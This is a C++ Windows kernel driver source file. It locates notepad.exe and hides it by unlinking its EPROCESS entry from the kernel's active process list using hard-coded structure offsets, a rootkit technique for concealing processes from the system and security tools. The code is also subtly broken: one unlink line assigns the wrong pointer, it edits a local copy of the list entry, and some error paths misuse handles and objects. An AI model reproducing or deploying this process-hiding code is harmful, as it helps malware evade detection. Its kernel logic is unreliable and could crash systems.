#include<Ntifs.h>
#include <ntddk.h>
#include <WinDef.h>





void SampleUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("Sample driver Unload called\n");
}


NTSTATUS HideProcess(int UniqueProcessId) {
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pid = { 0 };

	pid.UniqueProcess = (HANDLE)UniqueProcessId; //The pid of the process you want to hide
	if (ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &pid) != STATUS_SUCCESS) {
		DbgPrint("Can't open the process");
		ZwClose(hProcess);
		return STATUS_ACCESS_DENIED;
	}

	if (hProcess == NULL) {
		DbgPrint("The handle to the process is NULL");
		ZwClose(hProcess);
		return STATUS_SUCCESS;
	}

	PEPROCESS EP;

	if (::PsLookupProcessByProcessId(pid.UniqueProcess, &EP) == STATUS_INVALID_PARAMETER) {
		ObDereferenceObject(EP);
		DbgPrint("Can't get EPROCESS");
		return STATUS_INVALID_PARAMETER;
	}

	LIST_ENTRY list_entry = *((LIST_ENTRY*)((LPBYTE)EP + 0x448));
	list_entry.Blink->Flink = list_entry.Flink;
	list_entry.Flink->Blink = list_entry.Blink->Flink;

	ZwClose(hProcess);
	return STATUS_SUCCESS;
}


int getPIDByName(wchar_t* name) {
	PEPROCESS ep;
	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &ep) == STATUS_INVALID_PARAMETER) {
		ObDereferenceObject(ep);
		DbgPrint("Can't get EPROCESS");
		return STATUS_INVALID_PARAMETER;
	}

	PUNICODE_STRING Path = NULL;
	::SeLocateProcessImageName(ep, &Path);
	PLIST_ENTRY Process_List_Entry = ((LIST_ENTRY*)((LPBYTE)ep + 0x448));
	PLIST_ENTRY List_Entry = Process_List_Entry->Flink;
	LPBYTE pUpi;
	DbgPrint("Starting with buffer path: %wZ", Path);
	while (Path->Buffer == NULL) {
		DbgPrint("The buffer is null so going forward to next process: %wZ", Path);
		pUpi = ((LPBYTE)List_Entry) - 0x448;
		ep = ((PEPROCESS)pUpi);
		::SeLocateProcessImageName(ep, &Path);
		List_Entry = List_Entry->Flink;
	}

	DbgPrint("1.The path is: %wZ", Path);
	while (wcsstr(Path->Buffer, name) == NULL && Process_List_Entry != List_Entry->Flink) {
		pUpi = ((LPBYTE)List_Entry) - 0x448;
		ep = ((PEPROCESS)pUpi);
		::SeLocateProcessImageName(ep, &Path);
		DbgPrint("2. The path is: %wZ", (const wchar_t*)Path);
		List_Entry = List_Entry->Flink;
	}
	if (Process_List_Entry == List_Entry->Flink) {
		DbgPrint("%wZ isn't running quiting!", name);
		return STATUS_SUCCESS;
	}
	pUpi = ((LPBYTE)List_Entry->Blink) - 0x448 + 0x440;
	int UniqueProcessId = *((int*)pUpi); //Notepad PID
	DbgPrint("The PID of %ls is %d\n", name, UniqueProcessId);
	return UniqueProcessId;
}



extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	DriverObject->DriverUnload = SampleUnload;
	DbgPrint("Sample driver Load called\n");


	HideProcess(getPIDByName(L"notepad.exe"));
	DbgPrint("Finish");

	return STATUS_SUCCESS;
}
